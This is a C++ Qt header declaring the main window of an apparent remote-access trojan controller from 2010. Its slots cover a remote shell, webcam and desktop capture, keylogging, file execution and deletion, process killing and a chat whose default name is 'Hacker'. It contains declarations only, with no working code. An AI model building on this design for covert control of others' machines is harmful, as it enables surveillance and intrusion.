/*
 *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QTcpServer>
#include <QTcpSocket>
#include <QMessageBox>
#include <QInputDialog>
#include <QDataStream>
#include "../../lib/headers/Utilidades.h"
#include <QSignalMapper>
#include <ventanaarchivos.h>
#include <ventanaescritorio.h>
#include <ventanaopciones.h>
#include <ventanawebcam.h>
#include <ventanapuertos.h>
#include <QDir>
#include <QFile>
#include <QGridLayout>
#include <QThread>
#include <QTime>
#include <QTranslator>
namespace Ui
  {
  class MainWindow;
}

class MainWindow : public QMainWindow
  {
    Q_OBJECT
  public:
    MainWindow ( QWidget *parent = 0 );
    ~MainWindow();
    QTranslator traductor;
    QTcpServer server;
    QTcpServer serverArchivos;
    QTcpServer serverEscritorio;
    QTcpServer serverWebcam;
    QTcpSocket *socket [100];
    QTcpSocket socketDemoxy;
    QSignalMapper mapa;
    QGridLayout *layoutPrincipal;
    QString hostDemoxy;
    QString alias;
    QString copiaRuta;
    QString copiaNombre;
    QThread hilo;
    quint16 port;
    quint16 portArchivos;
    quint16 portEscritorio;
    quint16 portWebcam;
    int conexiones;
    int activo;
    Utilidades util;
    ventanaArchivos ventana;
    ventanaEscritorio escritorio;
    ventanawebcam webcam;
    ventanaOpciones opciones;
    ventanaPuertos opcionesPuertos;
  public slots:
    //slost de conexion
    void escuchar();
    void nuevaConexion();
    void nuevaConexionArchivos();
    void nuevaConexionEscritorio();
    void nuevaConexionWebcam();
    void conectarDemoxy();
    void nuevaConexionDemoxy();
    void seleccionarServidor();
    void ping();
    void cerrarServidor();
    void llegadaDatos();
    void llegadaDatosDemoxy();
    void desconectado ( int indice );
    void reinciar();
    void desinfectar();
    void apagarEquipo();
    void reiniciarEquipo();
    void actualizarProcesos();
    void matarProceso();
    //slots manejo de frames
    void listaOpciones();
    void esconderFrames();
    //slots de shell remota
    void shellEnviar();
    //slots menu ayuda
    void showAboutQt();
    void licencia();
    void about();
    //slot menu opciones
    void opcionesServidor();
    void opcionesVentanaPuertos();
    //slot puertos
    void ponerPuertos();
    // slots de administrador de archivos
    void cambioComboUnidad();
    void abrirVentanaArchivos();
    void abrirVentanaWebcam();
    void ponerUnidades(QStringList unidades);
    void ponerArchivos ( QStringList archivos );
    void ponerDirectorios ( QStringList directorios );
    void directorioCambio();
    void archivosIr();
    void archivosAtras();
    void archivosHome();
    void archivosRefresco();
    void archivosDescargar();
    void archivosSubir();
    void archivosBorrar();
    void archivosCarpeta();
    void archivosEjecutar();
    void archivosCopiar();
    void archivosMover();
    void archivosRenombrar();
    void archivosPrevia();
    void archivosBorrarCarpeta();
    void archivosTamano();
    //slots de mensajes
    void enviarMensaje();
    //slots del escritorio remoto
    void abrirVentanaEscritorio();
    void clicado(QString cadena);
    void enviarTecla(QString cadena);
    //slots del chat
    void abrirChat();
    void cerrarChat();
    void enviarMensajeChat();
    void ponerMensajeChat(QString mensajeChat,QString quien = "Hacker");
    void activarKey();
    void desactivarKey();
    void recibirKey();
    void limpiarKey();
    void pedirInformacion();
    void traducir(QAction *idioma);
  protected:
    void changeEvent ( QEvent *e );
    virtual bool event(QEvent *event);

  private:
    Ui::MainWindow *ui;
  };

#endif // MAINWINDOW_H
